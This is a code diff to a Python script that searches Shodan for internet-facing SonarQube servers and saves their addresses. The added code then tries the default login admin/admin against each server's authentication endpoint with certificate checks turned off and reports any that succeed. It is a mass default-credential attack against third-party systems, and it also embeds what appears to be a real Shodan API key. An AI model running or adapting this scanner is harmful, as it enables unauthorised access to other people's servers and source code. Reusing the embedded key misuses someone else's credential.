@@ -1,4 +1,6 @@
 import shodan
+import requests as rt 
+import urllib3
 SHODAN_API = "okdW2znkGhdiv5jW38Z0svbHuNMoaGpQ"
 api = shodan.Shodan(SHODAN_API)
 out_file = open('sonarqube-instances.txt','a')
@@ -20,3 +22,21 @@ try:
         print('')
 except shodan.APIError as e:
     print(f"error: {e}")
+
+
+#same code but query only changed here to get a list of urls of sonarqube
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+urls = open("sonarqube-instances.txt","r")
+data = {"login":"admin",
+"password":"admin"
+}
+endpoint = "/api/authentication/login"
+for url in urls.readlines():
+    print("Testing- "+url)
+    try:
+        req = rt.post(url=url.rstrip("\n")+endpoint,data=data,verify=False)
+        if req.status_code==200:
+            print("Login Success")
+    except:
+        pass
